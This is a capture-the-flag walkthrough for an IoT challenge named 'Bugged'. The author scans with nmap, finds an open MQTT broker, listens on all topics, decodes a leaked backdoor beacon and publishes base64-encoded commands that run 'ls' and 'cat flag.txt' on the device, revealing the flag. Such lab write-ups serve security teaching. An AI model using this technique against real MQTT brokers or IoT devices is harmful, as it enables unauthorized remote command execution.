# Bugged

## Challenge Information
- **Challenge Name**: Bugged
- **Category**: IoT Security
- **Difficulty Level**: Easy

## Analysis

First of all, run nmap on the ipaddress 
```
nmap <IP_ADDRESS>
```
But this did not give any open ports. So we have to move towards the scanning of all ports for aggressive scanning of all ports, which gave an open port `1883/tcp open mqtt`. 
```
nmap -p 1-65535 -T4 -Pn <IP_ADDRESS>
```
MQTT is a standards-based protocol that's commonly used for data transmission between Internet of Things (IoT) devices and the cloud. It's designed for devices with limited network bandwidth or resource constraints, such as smart sensors and wearables.

Now we will be subscribing to the service to see the communication using the tool `mosquitto_sub`: `mosquitto_sub -h <IP_ADDRESS> -p 1883 -t "#"`. Here we are using `#` to subscribe to all topics. As a result, we can see some communication like:
```
{"id":129618052497693049,"color":"GREEN","status":"ON"}
{"id":1909226905601607364,"in_use":true,"temperature":159.55472,"toast_time":130}
{"id":15739021675742454388,"temperature":24.405937}
{"id":7735145274395155749,"gain":54}
{"id":17520807554009645173,"temperature":23.309986}
{"id":7444800185129679608,"color":"GREEN","status":"ON"}
{"id":9483337689556477149,"yaxis":-163.79924,"xaxis":124.93912,"zoom":1.823662,"movement":false}
{"id":13497795867139887626,"in_use":false,"temperature":146.00859,"toast_time":303}
{"id":10731702524761977214,"gain":47}
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
{"id":11806201323585827923,"temperature":24.21324}
```

The suspicious thing here is the base64 string. Lets decode it using CyberChef, and it will give us:
```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
```

Here we got:
- The Device ID: "id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d". This is a UUID representing a unique identifier for the IoT device.
- Registered Commands: "registered_commands":["HELP","CMD","SYS"]. The device recognizes the commands HELP, CMD, and SYS, likely for remote control or debugging purposes.
- Publish Topic: "pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub". The device uses this topic to publish data.
- Subscribe Topic: "sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub". The device listens to this topic for commands or instructions.

Now we will subscribe to the publish topic to see the device's outgoing messages: 
```
mosquitto_sub -h <IP_ADDRESS> -p 1883 -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"
```
Simultaneously, run following command in different terminal to send the message:
```
mosquitto_pub -h <IP_ADDRESS> -p 1883 -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "HELP"
```
From this, we will receive a base64 string in the terminal where we subscribed the publish topic `SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=`.

Decode this string and it will give:
```
Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```

So, we came to know the exact format for running the command. Encode the following into base64: 
```
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}
```
It will give an encoding `eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ==`. Actually we are trying to execute `ls` command.

Again send this as a message to the terminal: 
```
mosquitto_pub -h <IP_ADDRESS> -p 1883 -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ=="
```
This time, we will receive a base64 encoding `eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbiJ9`. Decode this and it will give `{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag.txt\n"}`. It means that the file for the flag is present in the same directory.

Hence, we will modify the command again get the response on the subscribed terminal. Encode `{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}` into base64 and send it in the terminal 
```
mosquitto_pub -h <IP_ADDRESS> -p 1883 -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0="
```
In the subscribed terminal, we will receive `eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9`.

Decode it and it will reveal the flag 
```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{18d44fc0707ac8dc8be45bb83db54013}\n"}
```
